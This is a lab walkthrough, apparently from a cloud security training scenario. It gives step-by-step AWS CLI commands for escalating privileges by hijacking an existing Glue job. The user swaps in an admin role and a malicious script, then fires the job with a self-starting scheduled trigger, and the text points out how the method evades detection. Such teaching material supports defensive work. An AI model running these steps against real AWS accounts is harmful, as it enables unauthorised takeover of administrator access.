# Guided Walkthrough: Privilege Escalation via iam:PassRole + glue:UpdateJob + glue:CreateTrigger

This scenario demonstrates a stealthy privilege escalation vulnerability where a user with `iam:PassRole`, `glue:UpdateJob`, and `glue:CreateTrigger` permissions can modify an existing AWS Glue job to use an administrative role and execute malicious code. Unlike `glue:CreateJob` which creates new resources that may raise alerts, `glue:UpdateJob` modifies existing infrastructure, making detection significantly more difficult.

AWS Glue jobs are ETL (Extract, Transform, Load) workloads that execute code in a managed Apache Spark or Python shell environment. Organizations commonly have dozens or hundreds of Glue jobs running legitimate data pipelines. When an attacker updates an existing job's execution role and script location, then creates a trigger with the `--start-on-creation` flag, they establish automated privilege escalation that executes on a schedule (e.g., every minute).

The update-based approach is particularly dangerous because it blends into normal operations. Updating existing jobs is a common maintenance activity, whereas creating new jobs with administrative roles is more suspicious. This technique demonstrates how attackers can abuse legitimate change management workflows to achieve persistent privilege escalation while evading detection.

## The Challenge

You have credentials for `pl-prod-glue-006-to-admin-starting-user` — a limited IAM user. Your goal is to reach full administrator access on the AWS account, specifically by escalating to `pl-prod-glue-006-to-admin-target-role`, which holds `AdministratorAccess`.

Your starting user has three key permissions:
- `iam:PassRole` on the target role `pl-prod-glue-006-to-admin-target-role`
- `glue:UpdateJob` on all Glue jobs
- `glue:CreateTrigger` on all Glue triggers

There is already a Glue job `pl-glue-006-to-admin-job` deployed in the account running benign code under a non-privileged role. You won't be creating a new job — you'll be hijacking this existing one.

## Reconnaissance

First, verify who you are and confirm you don't already have admin access:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-glue-006-to-admin-starting-user

aws iam list-users --max-items 1
# AccessDenied -- good, no admin access yet
```

Now look at the existing Glue job to understand its current configuration:

```bash
aws glue get-job --job-name pl-glue-006-to-admin-job --query 'Job.{Role:Role,Command:Command}'
```

You'll see the job is currently using `pl-prod-glue-006-to-admin-initial-role` (a non-privileged role) and pointing to a benign Python script. This is the job you're going to modify.

## Exploitation

### Step 1: Update the Glue Job

Use `glue:UpdateJob` combined with `iam:PassRole` to swap the job's execution role to the admin target role and replace the script with a malicious one that attaches `AdministratorAccess` to your starting user:

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)

aws glue update-job \
  --job-name pl-glue-006-to-admin-job \
  --job-update "Role=arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-glue-006-to-admin-target-role,Command={Name=pythonshell,ScriptLocation=s3://pl-glue-scripts-glue-006-${ACCOUNT_ID}-{suffix}/malicious_script.py,PythonVersion=3.9}"
```

The `iam:PassRole` permission allows you to hand the privileged role to the Glue service. Without it, the `update-job` call would be rejected. The malicious script — already staged in S3 by the scenario's Terraform infrastructure — calls `iam:AttachUserPolicy` to grant `AdministratorAccess` to your user.

### Step 2: Create a Scheduled Trigger with --start-on-creation

Now you need to execute the updated job. You don't have `glue:StartJobRun`, but you don't need it. A SCHEDULED trigger with `StartOnCreation=true` will fire the job automatically on the next cron tick — and also immediately upon creation:

```bash
TRIGGER_NAME="pl-glue-006-demo-trigger-$(date +%s | tail -c 6)"

aws glue create-trigger \
  --name "$TRIGGER_NAME" \
  --type SCHEDULED \
  --start-on-creation \
  --schedule "cron(0/1 * * * ? *)" \
  --actions "[{\"JobName\": \"pl-glue-006-to-admin-job\"}]"
```

The trigger is now active and will fire the job every minute. Within 1-3 minutes the job will have run.

### Step 3: Wait for the Job to Execute

Monitor the trigger state and job run status:

```bash
# Check that the trigger is ACTIVATED
aws glue get-trigger --name "$TRIGGER_NAME" --query 'Trigger.State'

# Poll for a job run to appear and complete
aws glue get-job-runs --job-name pl-glue-006-to-admin-job --max-results 1
```

Keep polling until you see `JobRunState: SUCCEEDED`. This typically takes 1-3 minutes.

## Verification

Once the job run succeeds, wait ~15 seconds for IAM policy propagation, then confirm your escalation:

```bash
# Verify the policy is attached
aws iam list-attached-user-policies --user-name pl-prod-glue-006-to-admin-starting-user
# Should show AdministratorAccess

# Confirm admin access
aws iam list-users --max-items 3
# Should succeed now
```

## What Happened

You exploited the combination of `iam:PassRole`, `glue:UpdateJob`, and `glue:CreateTrigger` to hijack an existing, legitimate Glue ETL job. By swapping its execution role to an admin role and its script to a malicious one, then creating a self-starting scheduled trigger, you forced the Glue service to execute your code under administrative privileges — without ever needing `glue:StartJobRun`.

The technique is particularly effective in real environments because updating an existing job is far less suspicious than creating a new one with an admin role attached. Defenders watching for "new Glue jobs with admin roles" will miss an `UpdateJob` call that changes an existing job's role. The `--start-on-creation` flag eliminates the need for `StartJobRun` permission, tightening the required permission set and making the path harder to enumerate via static policy analysis alone.
